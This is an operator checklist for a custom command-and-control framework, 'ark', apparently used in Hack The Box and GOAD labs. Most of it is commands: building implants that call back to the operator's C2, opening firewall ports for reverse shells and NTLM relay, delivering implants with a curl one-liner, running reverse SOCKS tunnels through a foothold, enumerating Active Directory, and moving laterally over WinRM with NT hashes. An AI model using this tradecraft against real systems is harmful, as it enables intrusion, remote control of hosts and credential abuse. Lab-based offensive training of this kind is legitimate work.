# Operator inbound checklist (lab / HTB)

**Audience:** before dropping any implant or starting a listener that faces `tun0`.  
**Related:** `docs/OPERATOR_PRE_IMPLANT.md`, `docs/C_IMPLANT_LAB_CHECKLIST.md`, `scripts/htb_reverse_tunnel.sh`.

Wire protocol still returns **HTTP 404** on auth failure (anti-fingerprint). Teamserver logs must show the reason class.

## Auth drop reasons (server log)

| Reason | Meaning | Typical fix |
| --- | --- | --- |
| `unknown_implant` | Secret lookup failed / not registered | Rebuild implant with fleet secret; check `implant_secret` / ldflags |
| `hmac` | HMAC signature mismatch | Wrong secret, wrong implant ID, or corrupted payload |
| `skew` | Timestamp outside replay window | Host/DC clock skew; sync time or widen window (default 8h) |
| `replay` | Same (id, timestamp) already seen | Sleep too low with second-resolution timestamps (fixed: use ms); or dual teamservers sharing ID |
| `parse` | Protobuf unmarshal failed | Wrong path/body, non-implant client, truncated POST |
| `io` | Body read failed | Client disconnect mid-request |
| `internal` | Session key / DB / other server error | Check full log line |

Example lines:

```text
[register] unknown_implant id=abc: no secret
[beacon] skew reject implant=abc: timestamp outside replay window
[https] beacon drop reason=parse len=12: proto: …
[https] beacon drop implant=abc: beacon auth failed: hmac: …
```

## Pre-flight (every eng)

```text
[ ] HTB VPN up; note tun0 IP (ip -br a show tun0)
[ ] Target reachable (nmap or ping as appropriate)
[ ] Secrets only in files (mode 600) — never bash $$ in double quotes
[ ] Clock: compare operator UTC vs DC LDAP currentTime if Kerberos later
```

## Teamserver vs listener

| Command | What it starts |
| --- | --- |
| `ark teamserver` | Daemon: HTTPS implant listener + gRPC. Survives stdin EOF. **Use this for HTB C2.** |
| `ark serve` | Teamserver + operator REPL. REPL/stdin EOF does **not** stop C2 (SIGINT/SIGTERM does). |
| `ark serve --teamserver` | Same as `ark teamserver` |
| HTTPS listener port | Prefer **≥1024** (e.g. `:8443`) for rootless ops |

```bash
make ark
./build/ark teamserver          # keep C2 up (nohup / tmux / detached SSH)
# SSH SIGHUP still stops a foreground `ark serve`; use tmux or teamserver.
# gRPC often 127.0.0.1:50051; HTTPS implant port from config / flags (lab: 8443)
./build/ark certs seats         # operator + approver for dual-control oneshots
# other terminal:
./build/ark operator            # REPL; closing it leaves teamserver running
```

## Firewall (operator host)

Inbound from the box to your `tun0` is often blocked by **firewalld** / ufw:

```bash
# Fedora firewalld — lab C2 defaults to 1750 (1714–1764 often already open)
sudo firewall-cmd --add-port=1750/tcp
sudo firewall-cmd --add-port=8443/tcp   # only if you still listen on 8443
sudo firewall-cmd --add-port=8888/tcp   # NTLM relay (pre-implant)
sudo firewall-cmd --add-port=4444/tcp   # reverse shells
# optional (broader):
# sudo firewall-cmd --zone=trusted --add-interface=tun0
```

**Sanity check from target** (after foothold): `curl -vk https://YOUR_TUN0:1750/` (or `:443` / `:8443`) should get a TLS handshake (404 body is fine). If 8443 is firewalled, start the redirector first.

## One command (post-foothold)

ARK is **post-foothold** on firewalled Linux: `inbound drop` requires SSH. No SSH: `httpdrop` + `redirector`.

```bash
ark inbound status                         # tun0, listeners, proxy env, firewalld vs C2 port, redirector
# Teamserver on 8443, tun0 only allows 1714–1764 (or you want :443):
ark inbound redirector start --listen 0.0.0.0:1750 --to 127.0.0.1:8443
# 443 (needs CAP_NET_BIND_SERVICE / root):
# ark inbound redirector start --listen 0.0.0.0:443 --to 127.0.0.1:8443 --allow-priv-ports
# TLS is not terminated — implant CA pin still hits the teamserver cert.
ark inbound httpdrop --callback https://TUN0:1750 --dir DIR --listen 0.0.0.0:1723
                                              # no SSH: generate + curl one-liner (lockdir = one PID)
                                              # --listen blocks on Serve (Ctrl-C to stop); omit it for a python3 -m http.server one-liner
ark inbound drop user@TARGET_IP            # reverse tunnel + op generate (secret in DB)
# scp + run the printed implant, wait for session, then:
ark inbound through --probe DC:389         # socks start + env + SOCKS probe
eval "$(ark inbound env --port 1080)"      # host ldap/smb/ad/kerberos via implant
ark inbound close user@TARGET_IP
# after extra implant copies (HMAC replay):
ark op replay-clear <implant_id>
```

Do **not** `make implant-c-linux` on this path — HMAC secret never hits the teamserver DB. `op generate` (called by `drop`) registers it.

Host `ldap` / `smb` / `ad` / `kerberos` honor `ARK_PROXY` / `ALL_PROXY` (SOCKS5 only). Loopback is not proxied unless `ARK_PROXY_LOCAL=1`.

Foreground-only tunnel (no generate): `ark inbound tunnel user@TARGET` or `scripts/htb_reverse_tunnel.sh`.

## When operator cannot reach the DC

Start C reverse SOCKS, then run host AD tools through it (this is the fill-skeleton path):

```bash
ark inbound through --probe DC:389
eval "$(ark inbound env --port 1080)"
ark ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
ark smb shares --host DC --anon
ark kerberos skew --dc DC
```

## Implant build hygiene

```bash
# Windows primary (C)
make implant-c CALLBACK_URL=https://YOUR_C2:8443 \
  CA_CERT_PATH=$HOME/.ark/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10

# Linux primary after foothold: prefer inbound drop (registers HMAC secret).
# ark inbound drop user@TARGET
# Direct generate (also registers secret):
#   ark op generate --os linux --language c --callback https://127.0.0.1:8443 --out implant_c_linux
# Bare `make implant-c-linux` HMAC-rejects unless you register-secret the Makefile secret.
```

- Empty implant ID/secret → **fail closed** at build/load  
- HTTPS without CA pin → fail closed for C implant  
- Lab sleep: **≥500 ms** (ms timestamps; sub-second OK)  
- Linux implant is **C only** (`make implant-c-linux`). Go Linux is archived.

## WinRM PTH (A.1 notes)

```text
lateral winrm <host> "whoami" --user U --domain DOM --hash <32-hex-NT>
# or: --pass / --pass-file
```

| Path | Message encryption | Notes |
| --- | --- | --- |
| Password | **Yes** (NTLM seal via masterzen Encryption) | Prefer when password is available |
| Hash (PTH) | **Yes** (NTLM Sign/Seal + SPNEGO multipart) | Domain-aware TYPE3; **one flow** — seal if negotiated, no seal→plain retry. Sequential commands reuse the same WinRM session. |

On failure, errors include `pth_layer=` (`transport` / `http_negotiate` / `ntlm_handshake` / `key_derivation` / `sign_seal` / `winrm_mime` / `session_lifecycle`). Day-3 gate: name the layer before more PTH feature work. Live GOAD/pypsrp parity remains eng-verify (`docs/C_IMPLANT_LAB_CHECKLIST.md` §5).

## Dual-seat oneshots

```bash
./build/ark op sessions
./build/ark op shell -- whoami
./build/ark op lateral winrm <IP> "whoami" --user u --domain D --hash <NT>
./build/ark op pending
./build/ark op approve-all
```

## End of session

```text
[ ] Stop SOCKS / listeners not needed
[ ] Kill implants on target
[ ] Close reverse tunnel SSH
[ ] firewall-cmd --remove-port=… if temporary
[ ] No secrets left in git status
```
